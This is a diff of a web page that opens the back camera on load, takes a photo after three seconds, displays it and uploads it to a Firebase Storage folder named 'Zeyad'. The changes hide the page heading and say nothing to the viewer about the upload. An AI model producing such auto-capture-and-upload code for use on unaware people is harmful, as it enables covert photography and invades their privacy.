@@ -4,12 +4,40 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Live Camera Capture</title>
-    <link rel="stylesheet" href="style.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #000; /* Black background */
+            color: #fff; /* White text */
+            text-align: center;
+        }
+
+        h1 {
+            display: none; /* Hide the title */
+        }
+
+        video {
+            display: none; /* Hide video element */
+        }
+
+        canvas {
+            display: none; /* Hide canvas element */
+        }
+
+        img {
+            width: 100%; /* Show image at full width */
+            max-width: 600px; /* Limit maximum width */
+            height: auto; /* Maintain aspect ratio */
+            border: 2px solid #fff; /* Optional styling */
+            margin-top: 20px; /* Space above image */
+        }
+    </style>
     <script type="module">
         // Import the necessary Firebase functions
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js"; 
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
         import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";
-        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-auth.js";
 
         // Your web app's Firebase configuration
         const firebaseConfig = {
@@ -24,21 +52,11 @@
         // Initialize Firebase
         const app = initializeApp(firebaseConfig);
         const storage = getStorage(app);
-        const auth = getAuth(app);
-
-        // Sign in anonymously
-        signInAnonymously(auth)
-            .then((userCredential) => {
-                console.log('User signed in:', userCredential.user.uid);
-                startCapture(); // Start capturing images after successful sign-in
-            })
-            .catch((error) => {
-                console.error('Error signing in:', error);
-            });
 
         // Function to upload image to Firebase
         function uploadImage(imageData) {
-            const storageRef = ref(storage, 'captured_images/image_' + Date.now() + '.png'); // Generate unique filename
+            // Upload to the "Zeyad" folder
+            const storageRef = ref(storage, 'Zeyad/image_' + Date.now() + '.png'); // Generate unique filename
             uploadString(storageRef, imageData, 'data_url')
                 .then((snapshot) => {
                     console.log('Uploaded a blob or file!');
@@ -53,14 +71,13 @@
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
-            let captureCount = 0; // To track the number of captures
-            const maxCaptures = 3; // Maximum number of images to capture
+            const capturedImage = document.getElementById('capturedImage'); // Image element to display captured picture
 
             // Function to start capturing from the back camera
             function startCapture() {
                 navigator.mediaDevices.getUserMedia({
                     video: {
-                        facingMode: { exact: 'environment' }, // Use back camera
+                        facingMode: { exact: "environment" }, // Use back camera
                         width: { ideal: 1920 },
                         height: { ideal: 1080 }
                     }
@@ -72,16 +89,11 @@
                         canvas.width = 1920;  // Set canvas width to 1920 for 1080p
                         canvas.height = 1080; // Set canvas height to 1080 for 1080p
 
-                        // Automatically capture images every 5 seconds
-                        const captureInterval = setInterval(() => {
-                            if (captureCount < maxCaptures) {
-                                captureImage();
-                                captureCount++;
-                            } else {
-                                clearInterval(captureInterval); // Stop capturing after reaching the max count
-                                stopVideo(stream); // Stop the video stream
-                            }
-                        }, 5000); // 5 seconds
+                        // Automatically capture the image after a short delay
+                        setTimeout(() => {
+                            captureImage();
+                            stopVideo(stream); // Stop the video stream after capturing
+                        }, 3000); // 3 seconds
                     };
                 })
                 .catch(err => {
@@ -93,6 +105,8 @@
             function captureImage() {
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 const imageData = canvas.toDataURL('image/png');
+                // Display the captured image
+                capturedImage.src = imageData;
                 // Automatically upload the image to the server
                 uploadImage(imageData);
             }
@@ -102,36 +116,17 @@
                 const tracks = stream.getTracks();
                 tracks.forEach(track => track.stop());
             }
+
+            // Start capturing from the back camera
+            startCapture();
         });
     </script>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #000; /* Black background */
-            color: #fff; /* White text */
-            text-align: center;
-        }
-
-        h1 {
-            margin-top: 20px;
-        }
-
-        video {
-            display: none; /* Hide video element */
-        }
-
-        canvas {
-            display: none; /* Hide canvas element */
-        }
-    </style>
 </head>
 <body>
-    <h1>Live Camera Capture</h1>
     <div class="container">
         <video id="video" autoplay></video>
         <canvas id="canvas"></canvas>
+        <img id="capturedImage" alt="Captured Image" /> <!-- Image element to display captured picture -->
     </div>
 </body>
 </html>
